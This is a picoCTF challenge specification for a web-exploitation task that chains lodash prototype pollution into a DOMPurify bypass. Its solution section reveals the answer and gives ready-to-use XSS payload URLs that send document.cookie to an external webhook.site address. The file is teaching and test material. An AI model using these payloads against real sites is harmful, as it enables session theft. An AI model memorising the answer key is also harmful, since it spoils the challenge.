# supply-me-vuln

- Namespace: picoctf/18739f24
- ID: supply-me-dom
- Type: custom
- Category: Web Exploitation
- Points: 1
- Templatable: yes
- MaxUsers: 1

## Description

The site uses multiple buggy libraries! Figure them out and carry out the exploit!


## Details

Browse {{link_as('/', 'here')}}, and find the flag!


## Hints

- How do you determine what library is running behind the scene and get its version? (hint: extensions would be useful!)
- This link might be useful: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution 
- How do data get passed from library to library?


## Solution Overview

- Install library detector extension on your browser and detect the library being used
- figure out the vulnerable libraries with library detector
- The libraries are dompurify and lodash
- Seems like the sink is at dompurify 
- Try to find gadget to pollute dompurify 
- Lodash has prototype pollution vulnerability 
- Figure out the payload for polluting dompurify 
- Figure out the payload to get document.cookie
- Send to victim 
- https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/dompurify.md
- cookie exploit url for remote server: http://localhost:8000?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src&__proto__[hasOwnProperty]={}&name=<img src onerror=fetch('https://webhook.site/62766d8c-83e6-40b6-a12d-6f65c884f7ce?cookie='%2Bdocument.cookie)>
- http://localhost:8000/?__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src&__proto__[hasOwnProperty]={}&name=%3Cimg%20src%20onerror=fetch(%27https://webhook.site/62766d8c-83e6-40b6-a12d-6f65c884f7ce?cookie=%27%2Bdocument.cookie)%3E

## Learning Objective

- Get to know about the supply chain attacks and prototype pollution

## Attributes

- author: Ian Lin
- organization: picoCTF
- event: picoCTF Problem Developer Training
